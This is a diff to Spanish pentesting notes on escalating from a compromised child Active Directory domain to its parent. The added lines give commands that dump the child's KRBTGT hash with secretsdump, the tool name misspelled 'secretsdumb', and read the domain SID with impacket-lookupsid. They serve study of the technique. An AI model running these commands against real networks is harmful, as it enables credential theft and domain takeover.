@@ -26,7 +26,17 @@ Este ataque permite comprometer un dominio `principal(parent)` una vez compromet
 Para obtener el hash `KRBTGT` de la cuenta secundaria(child), deberemos de usar la herramienta [[SECRETSDUMP]]
 
 ```shell
-```shell-session
-<dominio.secundarios>/<usuario.admin>@<IP> -just-dc-user <dominio>/krbtgt
+secretsdumb <dominio.secundarios>/<usuario.admin>@<IP> -just-dc-user <dominio>/krbtgt
 ```
+
+Obteniendo así el hash de la cuenta `KRBTGT`
+
+### Obtener el SID del dominio secundario(child)
+Usaremos la herramienta [[IMPACKET]] con el comando `lookupsid`
+
+```shell
+impacket-lookupsid <dominio.secundario>/<usuario.admin>@<IP> | grep "Domain SID"
 ```
+
+Obteniendo asi el SID del dominio secundario
+
